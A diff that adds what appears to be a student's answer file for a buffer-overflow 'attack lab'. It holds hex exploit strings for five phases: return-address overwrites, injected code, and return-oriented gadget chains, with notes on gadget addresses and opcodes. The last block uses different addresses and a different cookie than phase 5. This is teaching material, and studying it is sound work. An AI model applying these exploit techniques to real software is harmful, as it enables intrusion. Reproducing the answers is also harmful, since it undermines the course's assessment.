@@ -1,0 +1,92 @@
+phase 1
+-------------------------------------------------------------------------
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00
+50 17 40 00 00 00 00 00 
+
+24 (0x18) bytes of filler material, followed by the address of touch1, 
+written in little endian
+
+phase 2
+-------------------------------------------------------------------------
+48 c7 c7 dd d2 3c 78 c3
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00                	   
+f8 88 67 55 00 00 00 00
+7c 17 40 00 00 00 00 00
+
+phase 3
+-------------------------------------------------------------------------
+48 c7 c7 20 89 67 55 c3 
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+f8 88 67 55 00 00 00 00
+50 18 40 00 00 00 00 00
+37 38 33 63 64 32 64 64 00
+
+phase 4
+-------------------------------------------------------------------------
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+e1 18 40 00 00 00 00 00
+dd d2 3c 78 00 00 00 00
+ec 18 40 00 00 00 00 00
+7c 17 40 00 00 00 00 00
+
+24 (0x18) bytes of filler material. 4018e1 is the location of my gadget1, 
+which does a popq %rax indicated by 58 and the return code c3. In my case,
+I could not find "58 c3" but I found "58 90 c3", which works since 90 is 
+the nop code and has no function. 4018ec is the location of my gadget2, 
+which does a movq %rax, %rdi, which is given by the code "48 89 c7". 
+
+phase 5
+-------------------------------------------------------------------------
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+1b 19 40 00 00 00 00 00 
+ec 18 40 00 00 00 00 00
+e1 18 40 00 00 00 00 00
+48 00 00 00 00 00 00 00
+9d 19 40 00 00 00 00 00
+8f 19 40 00 00 00 00 00
+6e 19 40 00 00 00 00 00
+15 19 40 00 00 00 00 00
+ec 18 40 00 00 00 00 00
+50 18 40 00 00 00 00 00 
+37 38 33 63 64 32 64 64 
+
+24 bytes of filler material
+movq %rsp, %rax 48 89 e0 40191b
+movq %rax, %rdi 48 89 c7 4018ec
+popq %rax 58 4018e1
+48 byte spacing
+movl %eax, %esi but cant find so we use...
+    movl %eax, %edx 89 c2 
+        at 40199d or 401944
+    movl %edx, %ecx 89 d1 
+        at 40198f we have 89 d1 84 db c3
+    movl %ecx, %esi 89 ce 
+        at 40196e
+lea add_xy 401915 or 4019f7
+movq %rax, %rdi 48 89 c7 4018ec
+put address of touch 3 401850
+cookie as string 37 38 33 63 64 32 64 64
+
+   00 00 00 00 00 00 00 00
+    00 00 00 00 00 00 00 00
+    00 00 00 00 00 00 00 00 /* buffer */
+    e8 1a 40 00 00 00 00 00 /* step1: mov  %rsp, %rax */
+    2f 1a 40 00 00 00 00 00 /* step2: mov %rax, %rdi */
+    39 1a 40 00 00 00 00 00 /* step3: pop %rax */
+    48 00 00 00 00 00 00 00 /* step4: constant 0x48 */
+    a4 1a 40 00 00 00 00 00 /* step5: movl %eax, %edx */
+    fc 1a 40 00 00 00 00 00 /* step6: movl %edx, %ecx */
+    b3 1a 40 00 00 00 00 00 /* step7: movl %ecx, %esi */
+    68 1a 40 00 00 00 00 00 /* step8: lea (%rdi, %rsi, 1), %rax */
+    4a 1a 40 00 00 00 00 00 /* step9: mov %rax, %rdi */ 
+    8a 19 40 00 00 00 00 00 /* step10: touch3 address */
+    33 65 35 32 64 66 66 35 /* step11: string representtion of cookie */
+    00 00 00 00 00 00 00 00 
